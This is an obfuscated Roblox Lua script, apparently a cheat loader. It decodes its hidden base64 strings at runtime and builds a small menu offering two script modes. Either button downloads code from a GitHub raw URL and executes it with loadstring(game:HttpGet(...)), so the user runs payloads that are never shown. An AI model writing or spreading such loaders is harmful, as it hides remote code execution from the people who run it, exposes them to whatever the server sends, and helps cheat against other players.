local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


wait(5)

local screenGui = Instance.new(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('HlyOzTWhxcoeeJnjWBqVbuYoWNFVohYNGKAtjovWTdvNUouYMTMKQtfU2NyZWVuR3Vp'))
screenGui.Parent = game.Players.LocalPlayer:WaitForChild(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('gILNDgVJqjrrIBLJhcgvSMHKTDOJVDkcmoHonAtTgzsoscxtFFoClnSUGxheWVyR3Vp'))

local frame = Instance.new(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('LXvIyiozXqESVWPPqrsAZkbHRVdNGkhqGoouCIYHMCKEOyKbNStxZowRnJhbWU='))
frame.Size = UDim2.new(0, 200, 0, 50)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.new(1, 1, 1)
frame.Parent = screenGui

local title = Instance.new(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('BdVlbzNzWJeVLsnUZjiJSvvMplPvHUepkPWiGhuJAGIZlmQDPgNRYClVGV4dExhYmVs'))
title.Size = UDim2.new(1, 0, 0, 20)
title.Position = UDim2.new(0, 0, 0, -20)
title.Text = IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('zUGFLISusCiqxmKTacbObmRrmEbjOYfXjDhDlItUxsOnULhbnJTqRIuQ0hPU0UgU0NSSVBUIE1PRA==')
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundColor3 = Color3.new(0, 0, 0)
title.Parent = frame

local ASSISTdragging
local ASSISTdragInput
local ASSISTdragStart
local ASSISTstartPos

local function update(input)
    local delta = input.Position - ASSISTdragStart
    frame.Position = UDim2.new(ASSISTstartPos.X.Scale, ASSISTstartPos.X.Offset + delta.X, ASSISTstartPos.Y.Scale, ASSISTstartPos.Y.Offset + delta.Y)
end

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        ASSISTdragging = true
        ASSISTdragStart = input.Position
        ASSISTstartPos = frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                ASSISTdragging = false
            end
        end)
    end
end)

title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        ASSISTdragInput = input
    end
end)

title.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        ASSISTdragging = false
        ASSISTdragInput = nil
    end
end)

game:GetService(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('EumxYNkXgLsuUpCqVIsyqFADhrWDZQpxquoioLunIEYrJlScpCHqLxPVXNlcklucHV0U2VydmljZQ==')).InputChanged:Connect(function(input)
    if input == ASSISTdragInput and ASSISTdragging then
        update(input)
    end
end)

local SubmitButton = Instance.new(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('iaiGtxXctdGhtxdIKmjBanlLlcbjeKxaQrGQlWDZsGYAKmcESJUwpdDVGV4dEJ1dHRvbg=='))
SubmitButton.Size = UDim2.new(0.5, 0, 1, 0)
SubmitButton.Position = UDim2.new(0, 0, 0, 0)
SubmitButton.Text = IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('VGNSkyfikJgtUuxOmmMiQEXXNWcFvMtaulolLngPaIZlXcllZvqNJBDUFZQ')
SubmitButton.Parent = frame


local GetKeyButton = Instance.new(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('jxVboyBmACHwVLyWlrjoYTBCctghwKUdaChsSbgQfLfghYSXUuuSzlsVGV4dEJ1dHRvbg=='))
GetKeyButton.Size = UDim2.new(0.5, 0, 1, 0)
GetKeyButton.Position = UDim2.new(0.5, 0, 0, 0)
GetKeyButton.Text = IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('VozirLIiexmnasEAUudMbSnBZyvjdBYJHwvDkAPCxiorXYhFxWWPUmhTk9STUFM')
GetKeyButton.Parent = frame
--------------------------------------------------------------------------
SubmitButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    loadstring(game:HttpGet(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('pqFJFuqTUaEiogtrDwGbgFOiziAGEuYKbULahHwjwKbiNcWYbGPoHRbaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FTU0lTVEFTRC9BU0QvbWFpbi9CTENLLmx1YQ==')))()
end)

GetKeyButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    loadstring(game:HttpGet(IzPlPXcdrSygdHvKxHxSNLpQPctidjJkbApvTaQGjYvOHjBHAqhymZAYxhDuyxlMJqXNKKTZJjogrAUiYCHOeyRWJSwZkqPPnnV('CSMUjoAwccnOIyniGfqNRrYTejfaUHTpDTNZGoCUxnOXWapSkzhooxNaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FTU0lTVEFTRC9BU0QvbWFpbi9BU0QubHVh')))()
end)    